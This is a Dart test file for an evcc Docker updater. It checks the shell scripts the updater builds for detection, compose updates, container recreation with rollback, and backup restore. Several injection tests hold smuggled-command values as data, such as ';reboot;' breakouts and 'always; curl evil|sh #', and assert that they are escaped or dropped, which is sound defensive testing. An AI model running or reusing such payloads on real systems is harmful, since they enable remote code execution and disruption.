import 'dart:convert';
import 'dart:io';

import 'package:evcc_updater/src/commands.dart';
import 'package:evcc_updater/src/services/homeassistant_service.dart';
import 'package:flutter_test/flutter_test.dart';

/// A real bash for the batch runs: `bash` on Linux/macOS (CI). On Windows
/// `bash` may be the WSL launcher, so they only run with an explicit Git Bash
/// (PITOOL_TEST_BASH=C:\Program Files\Git\bin\bash.exe).
final String? _bash =
    Platform.isWindows ? Platform.environment['PITOOL_TEST_BASH'] : 'bash';

void main() {
  group('buildDetectBatch', () {
    test('wraps each probe as before, prints the end marker last, and keeps '
        'stdin away from all of it', () {
      expect(
          buildDetectBatch([('A', 'a'), ('B', 'b x')]),
          '{\n'
          'echo\necho @@PT@@A@@PT@@\n{ a ; } 2>&1 || true\n'
          'echo\necho @@PT@@B@@PT@@\n{ b x ; } 2>&1 || true\n'
          'echo\necho @@PT@@$detectEndKey@@PT@@\n'
          '} </dev/null\n');
    });

    test('without probes it is still a script bash accepts', () {
      // An empty `{ }` would be a syntax error; the end marker keeps the
      // group from being one.
      expect(buildDetectBatch(const []),
          '{\necho\necho @@PT@@$detectEndKey@@PT@@\n} </dev/null\n');
    });

    test('split: the end marker is a section of its own, after the probes',
        () {
      final sec = splitDetectSections(
          '\n@@PT@@A@@PT@@\naaa\n\n@@PT@@$detectEndKey@@PT@@\n');
      expect(sec.keys.toList(), ['A', detectEndKey]);
      expect(sec['A'], 'aaa');
      // Cut off in front of it, or in the middle of its line: not there.
      expect(splitDetectSections('\n@@PT@@A@@PT@@\naaa\n'),
          isNot(contains(detectEndKey)));
      expect(splitDetectSections('\n@@PT@@A@@PT@@\naaa\n\n@@PT@@$detectEndKey'),
          isNot(contains(detectEndKey)));
    });
  });

  // The batch through a real bash, fed on stdin like `bash -s` on the Pi. The
  // probes are shell builtins and a name that does not exist: nothing of the
  // machine running the tests is called.
  group('buildDetectBatch in bash', () {
    Future<({int code, Map<String, String> sec})> run(
        List<(String, String)> probes) async {
      final p = await Process.start(_bash!, ['-s']);
      final out = p.stdout.transform(utf8.decoder).join();
      p.stderr.drain<void>();
      p.stdin.write('${buildDetectBatch(probes)}\n');
      await p.stdin.close();
      return (code: await p.exitCode, sec: splitDetectSections(await out));
    }

    test('a run to the end: every section, then the end marker', () async {
      final r = await run([
        ('A', "printf 'no newline'"),
        ('B', 'echo out; echo err >&2; false'),
        ('C', 'pitool-no-such-tool 2>/dev/null'),
        ('D', 'echo d'),
      ]);
      expect(r.code, 0);
      expect(r.sec.keys.toList(), ['A', 'B', 'C', 'D', detectEndKey]);
      expect(r.sec['A'], 'no newline');
      expect(r.sec['B'], 'out\nerr'); // stderr merged, the failure swallowed
      expect(r.sec['C'], '');
      expect(r.sec['D'], 'd');
    });

    test('a probe that reads stdin gets nothing, not the rest of the script',
        () async {
      // The script arrives on bash's stdin. A probe that reads from it (a
      // `pihole` wrapper around `docker exec -i`, say) would otherwise swallow
      // every line that follows — the end marker included, and a complete
      // detection would be taken for a cut-off one.
      final r = await run([
        ('A', 'echo a'),
        ('B', r'while read -r l; do echo "ate: $l"; done'),
        ('C', 'echo c'),
      ]);
      expect(r.code, 0);
      expect(r.sec.keys.toList(), ['A', 'B', 'C', detectEndKey]);
      expect(r.sec['B'], '');
      expect(r.sec['C'], 'c');
    });

    test('the shell is gone mid-batch: what came is there, the end marker not',
        () async {
      final r = await run([
        ('A', 'echo a'),
        ('B', r'kill -9 $$'),
        ('C', 'echo c'),
      ]);
      expect(r.code, isNot(0));
      expect(r.sec['A'], 'a');
      expect(r.sec, isNot(contains('C')));
      expect(r.sec, isNot(contains(detectEndKey)));
    });
  }, skip: _bash == null ? 'needs bash (PITOOL_TEST_BASH on Windows)' : false);

  group('dockerListStateCommand', () {
    test('asks for the state, and for the plain listing if that fails', () {
      expect(
          dockerListStateCommand,
          "docker ps --format '{{.Names}}|{{.Image}}|{{.State}}' 2>/dev/null "
          "|| docker ps --format '{{.Names}}|{{.Image}}'");
      // The listings of the other actions are what they were.
      expect(dockerListCommand, "docker ps --format '{{.Names}}|{{.Image}}'");
      expect(dockerListSudoCommand,
          "LC_ALL=C sudo -S docker ps --format '{{.Names}}|{{.Image}}'");
    });

    test('sudo variant: one sudo around both tries, nothing to expand', () {
      expect(dockerListStateSudoCommand,
          'LC_ALL=C sudo -S sh -c "$dockerListStateCommand"');
      // Inside the double quotes the shell must find nothing to act on.
      expect(dockerListStateCommand, isNot(matches(RegExp(r'["$`\\!]'))));
    });
  });

  group('dockerContainerState', () {
    const ps = 'db|postgres:16|running\n'
        'evcc|evcc/evcc:latest|restarting\n'
        'ha|ghcr.io/home-assistant/home-assistant:stable| Paused \n';

    test('reads the state of the named container', () {
      expect(dockerContainerState(ps, 'evcc'), 'restarting');
      expect(dockerContainerState(ps, 'db'), 'running');
      expect(dockerContainerState(ps, 'ha'), 'paused');
    });

    test('null without a state column (older Docker) or without the container',
        () {
      expect(dockerContainerState('evcc|evcc/evcc:latest\n', 'evcc'), isNull);
      expect(dockerContainerState('evcc|evcc/evcc:latest|\n', 'evcc'), isNull);
      expect(dockerContainerState(ps, 'evcc-db'), isNull);
      expect(dockerContainerState('', 'evcc'), isNull);
      expect(
          dockerContainerState('permission denied … docker.sock', 'evcc'),
          isNull);
    });

    test('the parsers of the listing are not thrown off by the third column',
        () {
      final evcc = parseEvccDocker(ps)!;
      expect(evcc.name, 'evcc');
      expect(evcc.image, 'evcc/evcc:latest');
      final ha = parseHomeAssistant(ps)!;
      expect(ha.name, 'ha');
      expect(ha.image, 'ghcr.io/home-assistant/home-assistant:stable');
      expect(ha.version, 'stable');
    });
  });

  group('parseEvccDocker', () {
    test('finds the evcc container by image among others', () {
      final d = parseEvccDocker('db|postgres:16\nmy-evcc|evcc/evcc:0.123');
      expect(d, isNotNull);
      expect(d!.name, 'my-evcc');
      expect(d.image, 'evcc/evcc:0.123');
    });
    test('matches on the container name too', () {
      final d = parseEvccDocker('evcc|ghcr.io/foo/bar:1');
      expect(d!.name, 'evcc');
    });
    test('returns null when no evcc container is present', () {
      expect(parseEvccDocker('db|postgres:16\nweb|nginx'), isNull);
      expect(parseEvccDocker(''), isNull);
    });

    test('prefers the image match over a sibling matching only by name', () {
      // evcc-db (postgres) sorts first but is NOT the evcc install.
      final d = parseEvccDocker('evcc-db|postgres:16\nevcc|evcc/evcc:latest');
      expect(d!.name, 'evcc');
      expect(d.image, 'evcc/evcc:latest');
    });

    test('does not mistake a lone sibling (evcc-db) for the evcc install', () {
      // Only a sibling running, image has no "evcc", name only contains it as a
      // prefix — must NOT be picked (avoids recreating the wrong container).
      expect(parseEvccDocker('evcc-db|postgres:16'), isNull);
      expect(parseEvccDocker('evcc-grafana|grafana/grafana'), isNull);
    });
  });

  group('isDockerPermissionError', () {
    test('detects the daemon permission / socket errors', () {
      expect(
        isDockerPermissionError(
            'permission denied while trying to connect to the Docker daemon socket'),
        isTrue,
      );
      expect(
        isDockerPermissionError(
            'Cannot connect to the Docker daemon at unix:///var/run/docker.sock'),
        isTrue,
      );
    });
    test('a normal listing is not a permission error', () {
      expect(isDockerPermissionError('evcc|evcc/evcc:latest'), isFalse);
      expect(isDockerPermissionError('bash: docker: command not found'), isFalse);
    });
  });


  group('dockerComposeUpdateScript', () {
    test('pulls then recreates only the evcc service in the project dir', () {
      final script = dockerComposeUpdateScript(const DockerComposeInfo(
        workingDir: '/home/pi/evcc',
        configFile: '/home/pi/evcc/docker-compose.yml',
        service: 'evcc',
      ));
      expect(script, contains("cd '/home/pi/evcc'"));
      expect(script, contains('set -e'));
      // v2 is probed; falls back to the v1 standalone binary.
      expect(script, contains('docker compose version'));
      expect(script, contains('docker-compose'));
      expect(script, contains(r'$DC'));
      // config file pinned with -f so a custom filename can't double-spawn.
      expect(script, contains("-f '/home/pi/evcc/docker-compose.yml'"));
      expect(script, contains("pull 'evcc'"));
      expect(script, contains("up -d 'evcc'"));
    });

    test('pins the compose project with -p when known', () {
      final script = dockerComposeUpdateScript(const DockerComposeInfo(
        workingDir: '/srv/evcc',
        configFile: '/srv/evcc/compose.yaml',
        service: 'evcc',
        project: 'myevcc',
      ));
      expect(script, contains("-p 'myevcc'"));
    });

    test('escapes single quotes so a label cannot break out of the shell', () {
      final script = dockerComposeUpdateScript(const DockerComposeInfo(
        workingDir: "/x';reboot;'",
        configFile: '',
        service: 'evcc',
      ));
      // The dangerous quote is escaped via the '\'' idiom, NOT left to close
      // the cd quoting and start a new `reboot` command.
      expect(script, contains(r"cd '/x'\''"));
      expect(script, isNot(contains("cd '/x';reboot")));
    });
  });

  group('shSingleQuote', () {
    test('wraps plain values and escapes embedded quotes', () {
      expect(shSingleQuote('evcc'), "'evcc'");
      expect(shSingleQuote("a'b"), r"'a'\''b'");
    });
  });

  group('firstInspectObject', () {
    test('takes the first element of the inspect array', () {
      final o = firstInspectObject('[{"Name":"/evcc"},{"Name":"/other"}]');
      expect(o, isNotNull);
      expect(o!['Name'], '/evcc');
    });
    test('accepts a bare object too', () {
      expect(firstInspectObject('{"Name":"/evcc"}')!['Name'], '/evcc');
    });
    test('returns null on empty / garbage / empty array', () {
      expect(firstInspectObject(''), isNull);
      expect(firstInspectObject('not json'), isNull);
      expect(firstInspectObject('[]'), isNull);
    });
  });

  group('composeInfoFromInspect', () {
    test('reads compose labels into DockerComposeInfo', () {
      final c = composeInfoFromInspect({
        'Config': {
          'Labels': {
            'com.docker.compose.project.working_dir': '/home/pi/evcc',
            'com.docker.compose.project.config_files':
                '/home/pi/evcc/docker-compose.yml',
            'com.docker.compose.service': 'evcc',
            'com.docker.compose.project': 'evcc',
          }
        },
      });
      expect(c, isNotNull);
      expect(c!.workingDir, '/home/pi/evcc');
      expect(c.service, 'evcc');
      expect(c.project, 'evcc');
    });
    test('returns null for a plain docker-run container (no compose labels)',
        () {
      expect(composeInfoFromInspect({'Config': {'Labels': {}}}), isNull);
      expect(composeInfoFromInspect({'Config': {}}), isNull);
      expect(composeInfoFromInspect({}), isNull);
    });
    test('rejects a tampered service name or a non-absolute working dir', () {
      Map<String, dynamic> labels(String wd, String svc) => {
            'Config': {
              'Labels': {
                'com.docker.compose.project.working_dir': wd,
                'com.docker.compose.service': svc,
              }
            }
          };
      // Service must match compose's charset; working dir must be absolute.
      expect(composeInfoFromInspect(labels('/home/pi/evcc', 'evcc;reboot')),
          isNull);
      expect(
          composeInfoFromInspect(labels('/home/pi/evcc', "ev'cc")), isNull);
      expect(composeInfoFromInspect(labels('home/pi/evcc', 'evcc')), isNull);
    });
  });

  group('buildDockerRunCommand', () {
    final evccInspect = {
      'Name': '/evcc',
      'Config': {
        'Image': 'evcc/evcc:latest',
        'Env': ['TZ=Europe/Berlin', 'PATH=/usr/local/sbin:/usr/local/bin'],
        'Labels': <String, dynamic>{},
      },
      'HostConfig': {
        'RestartPolicy': {'Name': 'unless-stopped', 'MaximumRetryCount': 0},
        'PortBindings': {
          '7070/tcp': [
            {'HostIp': '', 'HostPort': '7070'}
          ]
        },
        'Binds': ['/home/pi/evcc.yaml:/etc/evcc.yaml'],
        'NetworkMode': 'default',
      },
    };

    test('reconstructs the run command faithfully from inspect', () {
      final cmd = buildDockerRunCommand(evccInspect);
      expect(cmd, startsWith('docker run -d'));
      expect(cmd, contains("--name 'evcc'"));
      expect(cmd, contains('--restart unless-stopped'));
      expect(cmd, contains("-p '7070:7070'"));
      expect(cmd, contains("-v '/home/pi/evcc.yaml:/etc/evcc.yaml'"));
      expect(cmd, contains("-e 'TZ=Europe/Berlin'"));
      expect(cmd, endsWith("'evcc/evcc:latest'"));
    });
    test('drops pure image-default env vars like PATH', () {
      expect(buildDockerRunCommand(evccInspect), isNot(contains('PATH=')));
    });

    // --- audit 2026-08-15: identity/runtime settings the image does NOT
    // re-supply. Dropping them silently changed behaviour on recreate.
    test('preserves user, hostname, extra hosts and the command', () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Id': 'deadbeefcafe',
        'Config': {
          'Image': 'nginx:latest',
          'User': '1000:1000',
          'Hostname': 'my-app',
          'Cmd': ['nginx', '-g', 'daemon off;'],
          'Labels': <String, dynamic>{},
        },
        'HostConfig': {
          'ExtraHosts': ['db:10.0.0.5'],
        },
      });
      expect(cmd, contains("--user '1000:1000'"));
      expect(cmd, contains("--hostname 'my-app'"));
      expect(cmd, contains("--add-host 'db:10.0.0.5'"));
      // Command comes AFTER the image, like docker itself expects.
      expect(cmd.indexOf("'nginx:latest'"), lessThan(cmd.indexOf("'-g'")));
      expect(cmd, endsWith(r"'nginx' '-g' 'daemon off;'"));
    });

    test('a docker-generated hostname (= container id prefix) is not re-passed',
        () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Id': 'abc123def456',
        'Config': {'Image': 'nginx', 'Hostname': 'abc123def456'.substring(0, 12)},
        'HostConfig': <String, dynamic>{},
      });
      expect(cmd, isNot(contains('--hostname')));
    });

    test('a custom entrypoint survives, remainder lands after the image', () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Config': {
          'Image': 'busybox',
          'Entrypoint': ['/bin/sh', '-c'],
          'Cmd': ['echo hi'],
        },
        'HostConfig': <String, dynamic>{},
      });
      expect(cmd, contains("--entrypoint '/bin/sh'"));
      expect(cmd, endsWith(r"'busybox' '-c' 'echo hi'"));
    });

    test('hostile values in the new fields cannot break out', () {
      final cmd = buildDockerRunCommand({
        'Name': '/app',
        'Config': {
          'Image': 'x',
          'User': "root';reboot;'",
          'Cmd': ["a';reboot;'"],
        },
        'HostConfig': {
          'ExtraHosts': ["h';reboot;'"],
        },
      });
      expect(cmd, contains(r"'\''")); // escaped, not left to close the quote
      expect(cmd, isNot(contains("root';reboot")));
      expect(cmd, isNot(contains("a';reboot")));
      expect(cmd, isNot(contains("h';reboot")));
    });
    test('lets the image be overridden with a new tag', () {
      expect(buildDockerRunCommand(evccInspect, image: 'evcc/evcc:0.999'),
          endsWith("'evcc/evcc:0.999'"));
    });
    test('carries --device / --privileged / --group-add (serial-meter setups)',
        () {
      final serial = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'Privileged': true,
          'Devices': [
            {
              'PathOnHost': '/dev/ttyUSB0',
              'PathInContainer': '/dev/ttyUSB0',
              'CgroupPermissions': 'rwm'
            }
          ],
          'GroupAdd': ['dialout'],
          'CapAdd': ['SYS_RAWIO'],
          'RestartPolicy': {'Name': 'unless-stopped'},
        },
      };
      final cmd = buildDockerRunCommand(serial);
      expect(cmd, contains("--device '/dev/ttyUSB0:/dev/ttyUSB0:rwm'"));
      expect(cmd, contains('--privileged'));
      expect(cmd, contains("--group-add 'dialout'"));
      expect(cmd, contains("--cap-add 'SYS_RAWIO'"));
    });

    test('carries user labels but drops image/infra labels', () {
      final labeled = {
        'Name': '/evcc',
        'Config': {
          'Image': 'evcc/evcc:latest',
          'Labels': {
            'traefik.enable': 'true',
            'org.opencontainers.image.version': '0.123',
            'com.docker.compose.project': 'should-not-leak',
          },
        },
        'HostConfig': <String, dynamic>{},
      };
      final cmd = buildDockerRunCommand(labeled);
      expect(cmd, contains("-l 'traefik.enable=true'"));
      expect(cmd, isNot(contains('org.opencontainers')));
      expect(cmd, isNot(contains('com.docker')));
    });

    test('drops a tampered restart-policy name (whitelist) — no injection', () {
      final evil = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'RestartPolicy': {'Name': r'always; curl evil|sh #'},
        },
      };
      final cmd = buildDockerRunCommand(evil);
      expect(cmd, isNot(contains('curl evil')));
      expect(cmd, isNot(contains('--restart')));
    });

    test('brackets an IPv6 host IP in a port binding', () {
      final v6 = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'NetworkMode': 'bridge',
          'PortBindings': {
            '7070/tcp': [
              {'HostIp': '::', 'HostPort': '7070'}
            ]
          },
        },
      };
      expect(buildDockerRunCommand(v6), contains("-p '[::]:7070:7070'"));
    });

    test('host network mode is preserved and -p is dropped', () {
      final hostNet = {
        'Name': '/evcc',
        'Config': {'Image': 'evcc/evcc:latest', 'Labels': <String, dynamic>{}},
        'HostConfig': {
          'NetworkMode': 'host',
          'PortBindings': {
            '7070/tcp': [
              {'HostIp': '', 'HostPort': '7070'}
            ]
          },
          'RestartPolicy': {'Name': 'always'},
        },
      };
      final cmd = buildDockerRunCommand(hostNet);
      expect(cmd, contains("--network 'host'"));
      expect(cmd, isNot(contains('-p ')));
      expect(cmd, contains('--restart always'));
    });
  });

  group('dockerRunRecreateScript', () {
    test('pulls, backs up the old container by rename, then runs the new one',
        () {
      final script = dockerRunRecreateScript(
        name: 'evcc',
        image: 'evcc/evcc:latest',
        runCommand: "docker run -d --name 'evcc' 'evcc/evcc:latest'",
      );
      expect(script, contains("docker pull 'evcc/evcc:latest'"));
      expect(script, contains("docker stop 'evcc'"));
      expect(script, contains("docker rename 'evcc' 'evcc-evccpitool-old'"));
      expect(script, contains("docker run -d --name 'evcc'"));
      expect(script, contains('set -e'));
    });

    test('auto-rolls back to the old container if the new one fails to start',
        () {
      final script = dockerRunRecreateScript(
        name: 'evcc',
        image: 'evcc/evcc:latest',
        runCommand: "docker run -d --name 'evcc' 'evcc/evcc:latest'",
      );
      // On run failure: restore the old container's name and start it again.
      expect(script, contains("docker rename 'evcc-evccpitool-old' 'evcc'"));
      expect(script, contains("docker start 'evcc'"));
      expect(script, contains('||'));
    });

    test('rolls back when the new container is accepted but then crashes', () {
      final script = dockerRunRecreateScript(
        name: 'evcc',
        image: 'evcc/evcc:latest',
        runCommand: "docker run -d --name 'evcc' 'evcc/evcc:latest'",
      );
      // `docker run -d` returns 0 on accept, so verify it is actually Running…
      // (State.Running would also be true during a crash loop.)
      expect(
          script,
          contains(
              "docker inspect -f '{{.State.Status}}|{{.RestartCount}}' 'evcc'"));
      expect(script, contains("!= 'running|0'"));
      // …and if not, restore the retained old container and fail.
      expect(script, contains("docker rename 'evcc-evccpitool-old' 'evcc'"));
      expect(script, contains('exit 1'));
    });
  });

  group('parseBackupList', () {
    test('lists .tar.gz archive paths, newest first, ignoring noise', () {
      const out = '/var/backups/evcc/evcc-backup-20260630-120000.tar.gz\n'
          '/var/backups/evcc/evcc-backup-20260628-090000.tar.gz\n';
      final list = parseBackupList(out);
      expect(list, [
        '/var/backups/evcc/evcc-backup-20260630-120000.tar.gz',
        '/var/backups/evcc/evcc-backup-20260628-090000.tar.gz',
      ]);
    });
    test('empty when there are no backups', () {
      expect(parseBackupList(''), isEmpty);
      expect(parseBackupList('ls: cannot access: No such file'), isEmpty);
    });
  });

  group('buildRestoreScript', () {
    test('stops evcc, extracts the archive to /, restarts evcc', () {
      final s =
          buildRestoreScript('/var/backups/evcc/evcc-backup-20260630.tar.gz');
      expect(s, contains('systemctl stop evcc'));
      expect(s,
          contains("tar -xzf '/var/backups/evcc/evcc-backup-20260630.tar.gz' -C /"));
      expect(s, contains('systemctl start evcc'));
    });
    test('single-quotes the path so it cannot break out of the shell', () {
      final s = buildRestoreScript("/var/backups/evcc/x';reboot;'.tar.gz");
      expect(s, contains(r"'\''")); // the quote was escaped, not left to close
      expect(s, isNot(contains("x';reboot"))); // no unescaped breakout
    });
  });
}
